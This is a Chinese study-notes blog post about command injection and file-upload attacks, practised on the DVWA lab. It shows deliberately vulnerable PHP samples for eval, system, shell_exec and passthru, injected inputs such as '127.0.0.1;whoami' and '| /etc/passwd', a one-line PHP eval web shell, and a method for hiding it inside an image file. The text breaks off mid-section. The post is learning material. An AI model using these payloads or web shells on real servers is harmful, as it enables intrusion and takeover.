<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"><title>命令注入与文件上传相关学习 | Ourobrosの博客</title><meta name="author" content="Ourobros"><meta name="copyright" content="Ourobros"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="命令注入一些概念补充服务器概念补充服务器是安装了某项服务的机器，不仅可以供本机使用也可以使外部机器使用。 简单来说就是每台机器上装载了类似于mysql数据库之类的东西，然后通过类似映射的手段来使该服务在其他的机器上也可以使用。 那么在找寻某项服务是，就需要搜索ip（该主机地址）+端口号（锁定某项服务，例如ssh服务端口。） ip概念补充  123456789公网和局域网是计算机网络中两个不同的概念"><meta property="og:type" content="article"><meta property="og:title" content="命令注入与文件上传相关学习"><meta property="og:url" content="https://ourobros.top/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/index.html"><meta property="og:site_name" content="Ourobrosの博客"><meta property="og:description" content="命令注入一些概念补充服务器概念补充服务器是安装了某项服务的机器，不仅可以供本机使用也可以使外部机器使用。 简单来说就是每台机器上装载了类似于mysql数据库之类的东西，然后通过类似映射的手段来使该服务在其他的机器上也可以使用。 那么在找寻某项服务是，就需要搜索ip（该主机地址）+端口号（锁定某项服务，例如ssh服务端口。） ip概念补充  123456789公网和局域网是计算机网络中两个不同的概念"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://ourobros.top/img/avatar(1).jpg"><meta property="article:published_time" content="2024-09-05T10:17:03.000Z"><meta property="article:modified_time" content="2024-09-05T10:30:36.042Z"><meta property="article:author" content="Ourobros"><meta property="article:tag" content="Hexo,blog,ourobros"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://ourobros.top/img/avatar(1).jpg"><link rel="shortcut icon" href="/img/favicon32x32.ico"><link rel="canonical" href="https://ourobros.top/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload='this.media="all"'><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"It has been","messageNext":"文章创建时间已经很久了，注意技术更迭导致的变化"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Ourobros","link":"链接: ","source":"来源: Ourobrosの博客","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"命令注入与文件上传相关学习",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2024-09-05 18:30:36"}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" type="text/css" href="./css/custom.css"><link rel="stylesheet" href="./css/progress_bar.css" media="defer" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (true) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar(1).jpg" onerror='onerror=null,src="/img/friend_404.gif"' alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background:0 0"><nav id="nav"><span id="blog-info"><a href="/" title="Ourobrosの博客"><span class="site-name">Ourobrosの博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">命令注入与文件上传相关学习<a class="post-edit-link" href="null_posts/命令注入与文件上传相关学习.md" title="编辑" target="_blank"><i class="fas fa-pencil-alt"></i></a></h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-05T10:17:03.000Z" title="发表于 2024-09-05 18:17:03">2024-09-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-05T10:30:36.042Z" title="更新于 2024-09-05 18:30:36">2024-09-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>21分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title="命令注入与文件上传相关学习"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><h3 id="一些概念补充"><a href="#一些概念补充" class="headerlink" title="一些概念补充"></a>一些概念补充</h3><h4 id="服务器概念补充"><a href="#服务器概念补充" class="headerlink" title="服务器概念补充"></a><strong>服务器概念补充</strong></h4><p>服务器是安装了某项服务的机器，不仅可以供本机使用也可以使外部机器使用。</p><p>简单来说就是每台机器上装载了类似于mysql数据库之类的东西，然后通过类似映射的手段来使该服务在其他的机器上也可以使用。</p><p>那么在找寻某项服务是，就需要搜索ip（该主机地址）+端口号（锁定某项服务，例如ssh服务端口。）</p><h4 id="ip概念补充"><a href="#ip概念补充" class="headerlink" title="ip概念补充"></a><strong>ip概念补充</strong></h4><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182301024.png" title="image-20240905182301024"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">公网和局域网是计算机网络中两个不同的概念。</span><br><span class="line"></span><br><span class="line">公网（Internet）是指全球范围内互联的计算机网络，它由各种全球性和区域性网络互相连接而成。公网通过广域网（WAN）技术实现，可以覆盖整个地球，并提供各种服务，如电子邮件、网页浏览、文件传输等。公网是开放的，任何拥有合法权限的用户都可以访问。</span><br><span class="line"></span><br><span class="line">局域网（LAN）是指在一个相对较小的地理范围内的计算机网络，通常限制在某个建筑物、办公室、校园或家庭内部。局域网通过局域网技术实现，一般使用以太网或Wi-Fi无线网络进行连接。局域网主要用于内部资源共享、打印机共享、文件传输和内部通信等。局域网通常由路由器或交换机连接到公网，以便局域网中的计算机可以访问公网上的资源。</span><br><span class="line"></span><br><span class="line">公网和局域网之间的联系主要是通过路由器实现的。路由器连接了公网和局域网，并负责将从公网发来的数据包转发给局域网中的适当设备，同时也负责将局域网中的数据包发送到公网。这样，局域网中的设备可以通过路由器与公网上的其他设备进行通信。</span><br><span class="line"></span><br><span class="line">总结起来，公网是全球范围内互联的网络，而局域网是限定在一个相对较小地理范围内的网络。它们之间通过路由器进行连接和通信。</span><br></pre></td></tr></table></figure><h5 id="不同类型局域网的应用场景"><a href="#不同类型局域网的应用场景" class="headerlink" title="不同类型局域网的应用场景"></a><strong>不同类型局域网的应用场景</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">不同的IP地址段可用于不同的局域网场景。以下是一些常见的情况：</span><br><span class="line"></span><br><span class="line">1. 192.168.x.x地址段：这是一个私有IP地址段，通常用于家庭、小型企业和组织的局域网中。例如，192.168.0.1或192.168.1.1通常用作路由器的默认IP地址。</span><br><span class="line">2. 172.16.x.x至172.31.x.x地址段：这也是一个私有IP地址段，通常用于中等规模企业、大型机构或学校的局域网中。</span><br><span class="line">3. 10.x.x.x地址段：这也是一个私有IP地址段，通常用于大型企业、学校和政府机构的局域网中。</span><br><span class="line">4. 公司或组织分配的自定义IP地址段：某些组织可能会向其员工或客户分配自定义的IP地址段，这些地址段可用于局域网中的特定场景。</span><br><span class="line">5. 其他公共IP地址段：除了上述私有IP地址段外，还有其他公共IP地址段可用于局域网中，如169.254.x.x地址段和100.64.x.x至100.127.x.x地址段等。</span><br><span class="line"></span><br><span class="line">在选择使用哪种IP地址段时，需要考虑到局域网的规模、安全需求、网络拓扑结构等因素。</span><br></pre></td></tr></table></figure><h5 id="docker镜像网络概念补充"><a href="#docker镜像网络概念补充" class="headerlink" title="docker镜像网络概念补充"></a>docker镜像网络概念补充</h5><p>docker镜像的网络是虚拟机（vmware）以自己的网络（物理机网络）构造的虚拟网络。通过端口映射来使外部机器来访问。</p><h3 id="DVWA靶场搭建"><a href="#DVWA靶场搭建" class="headerlink" title="DVWA靶场搭建"></a>DVWA靶场搭建</h3><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p><strong>在kali中使用docker搭建命令</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search dvwa</span><br></pre></td></tr></table></figure><p><strong>在弹出的选项中选择要下载的镜像</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull 镜像id</span><br></pre></td></tr></table></figure><h4 id="配置使用"><a href="#配置使用" class="headerlink" title="配置使用"></a>配置使用</h4><p><strong>下载完之后就可以使用容器调用镜像了</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -p 8080:80 -p 3307:3307 镜像id（这里由于80端口占用所以使用8080端口，打开的映像端口为3307）</span><br></pre></td></tr></table></figure><p><strong>之后就可以通过访问<em>ip：端口号</em>的方式访问该靶场</strong></p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182324611.png" title="image-20240905182324611"><p><strong>点击红框处重置账密</strong></p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182338806.png" title="image-20240905182338806"><p><strong>之后输入默认账密（admin：password）登入</strong></p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182350642.png" title="image-20240905182350642"><p><strong>设置难度（这里推荐low难度）</strong></p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182359872.png" title="image-20240905182359872"><h3 id="命令注入漏洞详解"><a href="#命令注入漏洞详解" class="headerlink" title="命令注入漏洞详解"></a>命令注入漏洞详解</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">命令注入（Command Injection）是一种常见的web应用程序漏洞，它允许攻击者在目标系统上执行恶意命令。这种漏洞通常发生在web应用程序使用用户提供的输入来构造操作系统命令的情况下。</span><br><span class="line"></span><br><span class="line">命令注入漏洞的原理是，当web应用程序对用户输入进行不充分的验证和过滤时，攻击者可以通过在可执行命令中注入恶意代码来执行任意命令。这样的注入通常发生在用户输入被直接或间接地传递给操作系统命令执行函数时。</span><br><span class="line"></span><br><span class="line">以下是一个简单的示例来说明命令注入漏洞的原理：</span><br><span class="line"></span><br><span class="line">假设有一个web应用程序，它接受用户的姓名并在服务器上运行一个命令来创建一个新的用户账户。应用程序可能会将用户提供的姓名作为参数传递给一个命令。</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">例如：system(&quot;useradd &quot; + username);</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">如果应用程序没有正确验证和过滤用户提供的姓名，攻击者可以通过在姓名字段中注入恶意代码来执行任意命令。例如，攻击者可以输入以下内容作为姓名：</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">&quot;; ls; echo &quot;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">这将会导致应用程序构造以下命令并在服务器上执行：</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">system(&quot;useradd &quot;; ls; echo &quot;&quot;);</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">攻击者成功地注入了一个额外的命令（`ls`），并且该命令会在应用程序中执行。</span><br><span class="line"></span><br><span class="line">通过利用命令注入漏洞，攻击者可以执行任意系统命令，包括查看、修改或删除文件，创建新的用户账户以及在目标系统上执行其他恶意操作。因此，对于接受用户输入并构造系统命令的web应用程序，必须进行严格的输入验证和过滤，以防止命令注入漏洞的利用。</span><br></pre></td></tr></table></figure><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182412197.png" title="image-20240905182412197"><p><strong>简单来说就是如果网页使用一些危险函数（如上图所示）导致用户提交的数据当做函数中的一部分被执行，如果用户提交的数据中包含一些命令，导致命令被执行（比如说上图中的用户提交ip加一个分号（php中一个命令后加入逻辑运算符后再写入另一个命令，可以使这两个命令，或重复此操作后的更多指令同时运行；）），则会导致严重的后果。</strong></p><p><strong>[但是这个漏洞在黑盒测试中很少，该漏洞一般是在白盒测试中被审计挖掘出来的。（补充：黑盒测试即只有一条网站链接来进行渗透测试的漏洞，白盒测试则是拥有网站源代码可以进行代码审计的渗透测试。）]</strong></p><p><strong>例如：在输入127.0.0.1;whoami后会回显以下信息（甚至可以不传入原有要求传入值，只传入逻辑运算符加命令，也可以运行该命令，并在报错信息下方回显命令要求的信息数据。）</strong></p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182422810.png" title="image-20240905182422810"><p><strong>可以看到，除了ping指令执行的效果之外，还执行了whoami指令，并回弹相应的信息。</strong></p><h4 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h4><h5 id="1-eval（）函数造成的命令注入漏洞"><a href="#1-eval（）函数造成的命令注入漏洞" class="headerlink" title="1.eval（）函数造成的命令注入漏洞"></a>1.eval（）函数造成的命令注入漏洞</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1、函数用法</span><br><span class="line">eval（phpcode）</span><br><span class="line">Phpcode 规定要计算的php代码。通常用分号结束每句代码的执行。</span><br><span class="line"></span><br><span class="line">2、环境源码：</span><br><span class="line">&lt;?php</span><br><span class="line">$var = &quot;var&quot;;</span><br><span class="line">if(isset($_GET[&quot;name&quot;]))&#123;</span><br><span class="line">$arg = $_GET[&quot;name&quot;];</span><br><span class="line">eval(&quot;\$var=$arg;&quot;);</span><br><span class="line">echo &quot;\$var = &quot;.$var;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">3、常用一句话木马</span><br><span class="line">&lt;?php @eval($_GET[&#x27;qwe&#x27;]);?&gt;</span><br><span class="line">---------------------------------------------------</span><br><span class="line">@表示后面即使执行错误，也不报错。                       |</span><br><span class="line">eval()函数表示括号内的语句字符串什么的全都当做PHP代码执行。|</span><br><span class="line">$_POST[&#x27;pass&#x27;]表示从页面中获得pass这个参数值。         |</span><br><span class="line">---------------------------------------------------</span><br><span class="line">构造语句：</span><br><span class="line">name=phpinfo()</span><br></pre></td></tr></table></figure><h5 id="2-system-函数造成的漏洞"><a href="#2-system-函数造成的漏洞" class="headerlink" title="2.system()函数造成的漏洞"></a>2.system()函数造成的漏洞</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1、函数用法:</span><br><span class="line">System(string command,int &amp;return_var)</span><br><span class="line">Command 要执行的命令</span><br><span class="line">Return_var 存放命令的执行后的状态值</span><br><span class="line">2、环境源码：</span><br><span class="line">&lt;?php</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if(isset($cmd))&#123;</span><br><span class="line">echo system(&quot;dir&quot;.$cmd);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">构造语句：</span><br><span class="line">Cmd=| /etc/passwd</span><br></pre></td></tr></table></figure><h5 id="3-shell-exec-函数造成的漏洞"><a href="#3-shell-exec-函数造成的漏洞" class="headerlink" title="3.shell_exec()函数造成的漏洞"></a>3.shell_exec()函数造成的漏洞</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1、函数用法：</span><br><span class="line">shell_exec(string command)</span><br><span class="line">command 要执行的命令</span><br><span class="line">2、环境源码：</span><br><span class="line">&lt;?php</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if(isset($cmd))&#123;</span><br><span class="line">echo &quot;&lt;h3&gt;&quot;;</span><br><span class="line">echo shell_exec(&quot;dir&quot;.$cmd);</span><br><span class="line">echo &quot;&lt;h3&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">3、测试：</span><br><span class="line">构造语句： | whoami</span><br></pre></td></tr></table></figure><h5 id="4-passthru-函数造成的漏洞"><a href="#4-passthru-函数造成的漏洞" class="headerlink" title="4.passthru()函数造成的漏洞"></a>4.passthru()函数造成的漏洞</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1、函数用法：</span><br><span class="line">void passthru (string command, int &amp;return_var)</span><br><span class="line">command 要执行的命令</span><br><span class="line">return_var 存放执行命令后的状态值</span><br><span class="line">同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix</span><br><span class="line">命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system()</span><br><span class="line">函数。</span><br><span class="line">2、环境源码：</span><br><span class="line">&lt;?php</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if(isset($cmd))&#123;</span><br><span class="line">echo passthru($cmd);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">3、测试</span><br><span class="line">构造语句 cmd=whoami</span><br></pre></td></tr></table></figure><h3 id="扩展：图片马制作流程"><a href="#扩展：图片马制作流程" class="headerlink" title="扩展：图片马制作流程"></a>扩展：图片马制作流程</h3><p><strong>博客连接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/1ink/p/15101706.html">https://www.cnblogs.com/1ink/p/15101706.html</a></strong></p><p>常见的图片马一般是直接将木马文件后缀名更改为jpg或者png文件来达到上传的条件，这里采用另外的几种方法。</p><h5 id="1-notepad-文件打开添加"><a href="#1-notepad-文件打开添加" class="headerlink" title="1.notepad++文件打开添加"></a>1.notepad++文件打开添加</h5><p>文件打开之后由于图片文件无法解析，所以会生成一堆乱码，这里只需要将一句话木马添加在乱码后边保存退出即可。</p><h5 id="2-cmd命令执行合成图片马"><a href="#2-cmd命令执行合成图片马" class="headerlink" title="2.cmd命令执行合成图片马"></a>2.cmd命令执行合成图片马</h5><p>我靠，精灵融合！！！！</p><p>cmd的copy指令和&gt;输出路径管道符可以实现将两个文件复制进同一个文件并输出该文件，所以这里使用以下命令就可以完成图片马的融合制作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cmd中 copy 1.jpg/b+2.php 3.jpg</span><br><span class="line"></span><br><span class="line">- /b是二进制形式打开</span><br><span class="line">- /a是ascii方式打开</span><br><span class="line">- 看到有人说一定要把图片放前面,木马放后面才能成功,我亲自试了这两种制作方式(另一种图片放后面),均能成功连接,但是后者的一句话木马在文件开头,不推荐</span><br><span class="line">（内容来源于博客）</span><br></pre></td></tr></table></figure><h5 id="3-ps"><a href="#3-ps" class="headerlink" title="3.ps"></a>3.ps</h5><p>ps的话是将图片打开之后，将文档简介的文档标题更改为一句话木马，也可以实现完成图片马的制作。</p><h5 id="4-文件欺骗"><a href="#4-文件欺骗" class="headerlink" title="4.文件欺骗"></a>4.文件欺骗</h5><figure class="highlight 